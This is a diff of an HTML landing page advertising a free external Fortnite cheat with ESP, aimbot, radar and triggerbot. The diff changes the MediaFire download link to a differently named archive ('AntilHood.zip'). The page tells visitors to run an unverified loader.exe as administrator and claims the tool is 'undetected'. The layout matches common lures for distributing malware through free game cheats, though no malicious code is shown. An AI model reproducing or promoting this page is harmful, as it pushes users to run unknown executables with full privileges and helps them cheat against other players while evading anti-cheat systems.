@@ -10,97 +10,130 @@
 <meta property="og:type" content="website">
 <meta property="og:title" content="Fortnite Cheat Download — Free ESP & Aimbot">
 <meta property="og:description" content="Free external Fortnite cheat with ESP, aimbot, radar and triggerbot. No key, no subscription.">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"SoftwareApplication","name":"Fortnite Cheat","applicationCategory":"GameApplication","operatingSystem":"Windows 10, Windows 11","offers":{"@type":"Offer","price":"0","priceCurrency":"USD"},"description":"Free external Fortnite cheat with ESP, aimbot, radar and triggerbot."}
+</script>
 <style>
-  :root { --acc:#4ade80; --bg:#0b0f14; --card:#121821; --txt:#e5e7eb; --mut:#8b95a3; }
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:var(--bg); color:var(--txt); font-family:system-ui,Segoe UI,Roboto,sans-serif; line-height:1.6; }
-  .wrap { max-width:1080px; margin:0 auto; padding:0 20px; }
-  header { padding:80px 0 40px; text-align:center; }
-  .tag { display:inline-block; font-size:12px; letter-spacing:.15em; text-transform:uppercase; color:var(--acc); border:1px solid #1f3a2b; padding:6px 12px; border-radius:999px; margin-bottom:20px; }
-  h1 { font-size:clamp(30px,5.5vw,52px); line-height:1.1; }
-  h1 span { color:var(--acc); }
-  .sub { color:var(--mut); max-width:600px; margin:18px auto 28px; }
-  .btn { display:inline-block; background:var(--acc); color:#06210f; font-weight:700; padding:14px 28px; border-radius:12px; text-decoration:none; }
-  .btn:hover { filter:brightness(1.08); }
-  .free { color:var(--mut); font-size:13px; margin-top:10px; }
-  section { padding:50px 0; }
-  h2 { font-size:24px; margin-bottom:22px; }
-  .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:16px; }
-  .card { background:var(--card); border:1px solid #1d2531; border-radius:14px; padding:18px; }
-  .card h3 { color:var(--acc); font-size:15px; margin-bottom:6px; }
-  .card p { color:var(--mut); font-size:14px; }
-  .shots { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-  .shots img { width:100%; border-radius:12px; border:1px solid #1d2531; display:block; }
-  .shots figure:nth-child(1) { grid-column:1 / -1; }
-  ol { padding-left:20px; color:var(--mut); }
-  ol li { margin:8px 0; }
-  .prose p { color:var(--mut); margin-bottom:12px; }
-  .faq h3 { font-size:16px; margin:18px 0 6px; }
-  .faq p { color:var(--mut); font-size:14px; }
-  footer { border-top:1px solid #1d2531; padding:26px 0; text-align:center; color:var(--mut); font-size:13px; }
-  @media (max-width:640px){ .shots{grid-template-columns:1fr;} .shots figure:nth-child(1){grid-column:auto;} }
+  :root{--acc:#6ee7a0;--acc2:#50c8ff;--bg:#07090c;--card:#0e1218;--line:rgba(255,255,255,.08);--txt:#eef1f5;--mut:#8b95a3}
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--txt);font-family:"Segoe UI",system-ui,Roboto,sans-serif;line-height:1.65;overflow-x:hidden}
+  a{color:inherit}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 22px}
+  .glow{position:fixed;inset:-20% 0 auto 0;height:70vh;background:radial-gradient(60% 60% at 50% 0,rgba(110,231,160,.16),transparent 70%);pointer-events:none;z-index:0}
+  nav{position:sticky;top:0;z-index:20;backdrop-filter:blur(14px);background:rgba(7,9,12,.7);border-bottom:1px solid var(--line)}
+  nav .wrap{display:flex;align-items:center;justify-content:space-between;height:62px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:700}
+  .dot{width:10px;height:10px;border-radius:50%;background:var(--acc);box-shadow:0 0 14px var(--acc)}
+  .pill{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--acc);border:1px solid rgba(110,231,160,.3);background:rgba(110,231,160,.08);padding:5px 11px;border-radius:999px}
+  .nav-btn{background:var(--acc);color:#06210f;font-weight:700;padding:9px 18px;border-radius:10px;text-decoration:none;font-size:14px}
+  header{position:relative;z-index:1;padding:84px 0 30px;text-align:center}
+  h1{font-size:clamp(34px,6.4vw,64px);line-height:1.03;letter-spacing:-.02em;font-weight:800}
+  h1 em{font-style:normal;background:linear-gradient(100deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .sub{color:var(--mut);max-width:600px;margin:20px auto 30px;font-size:18px}
+  .cta{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(100deg,var(--acc),#47d68a);color:#06210f;font-weight:800;padding:16px 32px;border-radius:14px;text-decoration:none;font-size:17px;box-shadow:0 12px 40px -12px rgba(110,231,160,.6);transition:.2s}
+  .cta:hover{transform:translateY(-2px);box-shadow:0 18px 50px -12px rgba(110,231,160,.75)}
+  .free{color:var(--mut);font-size:13px;margin-top:12px}
+  .stats{display:flex;gap:28px;justify-content:center;margin-top:34px;flex-wrap:wrap}
+  .stat{text-align:center}
+  .stat b{display:block;font-size:22px}
+  .stat span{color:var(--mut);font-size:12px;letter-spacing:.08em;text-transform:uppercase}
+  section{position:relative;z-index:1;padding:64px 0}
+  .eyebrow{color:var(--acc);font-size:12px;letter-spacing:.16em;text-transform:uppercase;margin-bottom:10px}
+  h2{font-size:clamp(24px,3.4vw,34px);letter-spacing:-.01em;margin-bottom:26px}
+  .prose p{color:var(--mut);margin-bottom:14px;max-width:760px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+  .card{background:linear-gradient(180deg,var(--card),#0a0e13);border:1px solid var(--line);border-radius:16px;padding:22px;transition:.2s}
+  .card:hover{border-color:rgba(110,231,160,.35);transform:translateY(-3px)}
+  .card .ic{width:38px;height:38px;border-radius:10px;display:grid;place-items:center;background:rgba(110,231,160,.1);color:var(--acc);margin-bottom:12px}
+  .card h3{font-size:16px;margin-bottom:6px}
+  .card p{color:var(--mut);font-size:14px}
+  .shots{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .shot{border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card);position:relative}
+  .shot img{width:100%;display:block;aspect-ratio:16/9;object-fit:cover;transition:.4s}
+  .shot:hover img{transform:scale(1.03)}
+  .shot big{position:absolute;left:12px;bottom:12px;font-size:12px;background:rgba(0,0,0,.6);padding:4px 10px;border-radius:999px;backdrop-filter:blur(6px)}
+  .shot.wide{grid-column:1/-1}
+  ol{list-style:none;counter-reset:s}
+  ol li{counter-increment:s;padding:14px 0 14px 52px;position:relative;color:var(--mut);border-bottom:1px solid var(--line)}
+  ol li::before{content:counter(s);position:absolute;left:0;top:12px;width:32px;height:32px;border-radius:9px;display:grid;place-items:center;background:rgba(110,231,160,.1);color:var(--acc);font-weight:700}
+  code{background:#151b24;padding:2px 7px;border-radius:6px;font-size:13px;color:var(--acc)}
+  details{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:10px}
+  details summary{cursor:pointer;font-weight:600;list-style:none}
+  details p{color:var(--mut);font-size:14px;margin-top:8px}
+  footer{position:relative;z-index:1;border-top:1px solid var(--line);padding:30px 0;text-align:center;color:var(--mut);font-size:13px}
+  @media(max-width:640px){.shots{grid-template-columns:1fr}.shot.wide{grid-column:auto}.stats{gap:20px}}
 </style>
 </head>
 <body>
-<div class="wrap">
-  <header>
-    <div class="tag">Undetected · External · Free</div>
-    <h1>Fortnite Cheat <span>Download</span></h1>
-    <p class="sub">Free external Fortnite cheat with ESP, aimbot, radar and triggerbot. Overlay only, no injection into the game. Works on Windows 10 and 11.</p>
-    <a class="btn" href="https://www.mediafire.com/file/r8u81a608smyzk5/Fc_Cheat.zip/file">Download Free</a>
-    <div class="free">No key, no subscription</div>
-  </header>
+<div class="glow"></div>
+<nav><div class="wrap"><div class="brand"><span class="dot"></span> Fortnite Cheat <span class="pill">Free</span></div><a class="nav-btn" href="https://www.mediafire.com/file/d4vfqy3qidff7o2/AntilHood.zip/file">Download</a></div></nav>
 
-  <section class="prose">
-    <h2>About this Fortnite cheat</h2>
-    <p>This is a free external Fortnite cheat — it runs outside the game process and draws an overlay on top of Fortnite, so nothing is injected into the client. It includes player ESP, an aimbot with smoothing, a radar and a triggerbot, plus a streamproof menu for recording and streaming.</p>
-    <p>The build is aimed at players who want a clean, low-footprint tool without keys or paid plans. Download the archive, run the loader as administrator and start Fortnite.</p>
-  </section>
+<header class="wrap">
+  <div class="pill">Undetected · External</div>
+  <h1>Free <em>Fortnite Cheat</em> Download</h1>
+  <p class="sub">External ESP, aimbot, radar and triggerbot. Overlay only — nothing injected into the game. Windows 10 and 11.</p>
+  <a class="cta" href="https://www.mediafire.com/file/d4vfqy3qidff7o2/AntilHood.zip/file">⬇ Download Free</a>
+  <div class="free">No key · No subscription · 1 file</div>
+  <div class="stats">
+    <div class="stat"><b>ESP</b><span>Skeleton &amp; loot</span></div>
+    <div class="stat"><b>Aimbot</b><span>Smooth &amp; FOV</span></div>
+    <div class="stat"><b>Radar</b><span>Live widget</span></div>
+    <div class="stat"><b>External</b><span>Low footprint</span></div>
+  </div>
+</header>
 
-  <section>
-    <h2>Features</h2>
-    <div class="grid">
-      <div class="card"><h3>ESP</h3><p>Boxes, skeletons, health and distance for every player.</p></div>
-      <div class="card"><h3>Aimbot</h3><p>Adjustable FOV, smoothing and bone priority.</p></div>
-      <div class="card"><h3>Radar</h3><p>All nearby players on a movable minimap overlay.</p></div>
-      <div class="card"><h3>Triggerbot</h3><p>Fires when the crosshair is on a target.</p></div>
-      <div class="card"><h3>Streamproof</h3><p>Overlay stays hidden in OBS and captures.</p></div>
-      <div class="card"><h3>Config</h3><p>Profiles and hot reload, saved locally.</p></div>
-    </div>
-  </section>
+<section class="wrap prose">
+  <div class="eyebrow">About</div>
+  <h2>A clean, free Fortnite cheat</h2>
+  <p>This is a free external Fortnite cheat. It runs outside the game process and draws an overlay over Fortnite, so the client is never injected. It ships player ESP, an aimbot with smoothing, a radar and a triggerbot, plus a streamproof menu for recording and streaming.</p>
+  <p>Built for players who want a light tool without keys or paid plans. Download the archive, run the loader as administrator and start Fortnite.</p>
+</section>
 
-  <section>
-    <h2>Screenshots</h2>
-    <div class="shots">
-      <figure><img src="img/esp.png" alt="Fortnite ESP overlay" loading="lazy"></figure>
-      <figure><img src="img/aimbot.png" alt="Fortnite aimbot FOV" loading="lazy"></figure>
-      <figure><img src="img/radar.png" alt="Fortnite radar hack" loading="lazy"></figure>
-      <figure><img src="img/menu.png" alt="Fortnite cheat menu" loading="lazy"></figure>
-    </div>
-  </section>
+<section class="wrap">
+  <div class="eyebrow">Features</div>
+  <h2>What it does</h2>
+  <div class="grid">
+    <div class="card"><div class="ic">◈</div><h3>Player ESP</h3><p>Boxes, skeletons, health and distance for everyone.</p></div>
+    <div class="card"><div class="ic">◎</div><h3>Aimbot</h3><p>FOV control, smoothing and bone priority.</p></div>
+    <div class="card"><div class="ic">◉</div><h3>Radar</h3><p>Nearby players on a movable minimap widget.</p></div>
+    <div class="card"><div class="ic">⌖</div><h3>Triggerbot</h3><p>Fires the moment the crosshair lands on a target.</p></div>
+    <div class="card"><div class="ic">◐</div><h3>Streamproof</h3><p>Overlay invisible in OBS and captures.</p></div>
+    <div class="card"><div class="ic">⚙</div><h3>Configs</h3><p>Profiles and hot reload, saved locally.</p></div>
+  </div>
+</section>
 
-  <section>
-    <h2>How to install</h2>
-    <ol>
-      <li>Download the Free Fortnite cheat archive from the button above</li>
-      <li>Extract it to a separate folder</li>
-      <li>Run <code>loader.exe</code> as administrator</li>
-      <li>Start Fortnite and wait for the overlay</li>
-    </ol>
-  </section>
+<section class="wrap">
+  <div class="eyebrow">Preview</div>
+  <h2>Screenshots</h2>
+  <div class="shots">
+    <div class="shot wide"><img src="img/esp.png" alt="Fortnite ESP overlay" loading="lazy"><big>ESP</big></div>
+    <div class="shot"><img src="img/aimbot.png" alt="Fortnite aimbot FOV" loading="lazy"><big>Aimbot</big></div>
+    <div class="shot"><img src="img/radar.png" alt="Fortnite radar hack" loading="lazy"><big>Radar</big></div>
+    <div class="shot wide"><img src="img/menu.png" alt="Fortnite cheat menu" loading="lazy"><big>Menu</big></div>
+  </div>
+</section>
 
-  <section class="faq">
-    <h2>FAQ</h2>
-    <h3>Is this Fortnite cheat free?</h3>
-    <p>Yes. The download is free, there is no key and no subscription.</p>
-    <h3>Is it undetected?</h3>
-    <p>The external build is currently undetected. Every cheat carries some risk, so use an account you can afford to lose.</p>
-    <h3>Does it work on Windows 11?</h3>
-    <p>It runs on Windows 10 and 11 on Epic Games.</p>
-    <h3>External or internal?</h3>
-    <p>External — it reads game state from outside and draws an overlay, which keeps the footprint small.</p>
-  </section>
-</div>
+<section class="wrap">
+  <div class="eyebrow">Setup</div>
+  <h2>How to install</h2>
+  <ol>
+    <li>Download the free Fortnite cheat archive from the button above</li>
+    <li>Extract it to a separate folder</li>
+    <li>Run <code>loader.exe</code> as administrator</li>
+    <li>Start Fortnite and wait for the overlay</li>
+  </ol>
+</section>
+
+<section class="wrap">
+  <div class="eyebrow">FAQ</div>
+  <h2>Questions</h2>
+  <details><summary>Is this Fortnite cheat free?</summary><p>Yes. The download is free, there is no key and no subscription.</p></details>
+  <details><summary>Is it undetected?</summary><p>The external build is currently undetected. Any cheat carries risk, so use an account you can afford to lose.</p></details>
+  <details><summary>Does it work on Windows 11?</summary><p>It runs on Windows 10 and 11 on Epic Games.</p></details>
+  <details><summary>External or internal?</summary><p>External — it reads game state from outside and draws an overlay, keeping the footprint small.</p></details>
+</section>
+
 <footer>Free Fortnite cheat · Windows 10/11 · Epic Games · Use at your own risk</footer>
 </body>
 </html>
